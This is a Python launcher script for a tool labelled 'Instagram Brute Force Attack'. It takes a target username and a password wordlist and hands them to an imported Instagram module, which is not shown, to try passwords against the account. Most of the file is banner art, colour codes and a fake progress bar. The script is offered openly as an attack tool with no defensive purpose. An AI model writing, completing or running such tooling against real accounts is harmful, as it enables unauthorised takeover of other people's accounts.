from Insta_Pass import Instagram
import os
import signal
import argparse
import time

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

def progress():
    print(O + 'Loading.  ' + W + ' 0%   |' + G + '█                               ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.. ' + W + ' 10%  |' + G + '████                            ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading...' + W + ' 20%  |' + G + '████████                        ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.  ' + W + ' 30%  |' + G + '███████████                     ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.. ' + W + ' 40%  |' + G + '██████████████                  ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading...' + W + ' 50%  |' + G + '█████████████████               ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.  ' + W + ' 60%  |' + G + '████████████████████            ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.. ' + W + ' 70%  |' + G + '███████████████████████         ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading...' + W + ' 80%  |' + G + '██████████████████████████      ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.  ' + W + ' 90%  |' + G + '█████████████████████████████   ' + W + '|', end='\r')
    time.sleep(0.1)
    print(O + 'Loading.  ' + W + ' 100% |' + G + '████████████████████████████████' + W + '|')
    time.sleep(1.5)

def logo():
    os.system("clear")
    print(R + '''

                   {}
   ,   A           {}
  / \, | ,        .--.
 |    =|= >      /.--.
  \ /` | `       |====|
   `   |         |`::`|  
       |     .-;`\..../`;_.-^-._
      /\ \/  / |...::..|`   :   `|
     |: \ | /  /   ::  |   .:.   |
       \ /\;-,/\   ::  |..|   |..|
       |\ <` >  >._::_.|  :   :  |
       | `""`  /   ^^  |   ':'   |
       |       |       \    :    /
       |       |        \   :   / 
       |       |___/\___|`-.:.-`
       |        \_ || _/    `
       |        <_ >< _>
       |        |  ||  |
       |        |  ||  |
       |       _\.:||:./_
       |      /____/\____\

        ''')
    print(O + "     Instagram Brute Force Attack")
    print(O + "         Done By:" + W + " ShyGorilla")
    print(O + "     https://github.com/ShyGorilla\n")

def signal_handler(signal, frame):
    print(B + '\n\n[' + O + '*' + B + '] ' + O + "CTRL + C" + W + " PRESSED\n")
    exit()

parser = argparse.ArgumentParser(logo())
parser.add_argument('-u', '--username', type=str, required=True, help='Target username')
parser.add_argument('-w', '--wordlist', type=str, required=True, help='Wordlist text file path')
args = parser.parse_args()

signal.signal(signal.SIGINT, signal_handler)


if __name__ == '__main__':
    logo()
    progress()
    logo()
    #home()
    s = Instagram()
    
    s.start(args.username, args.wordlist)
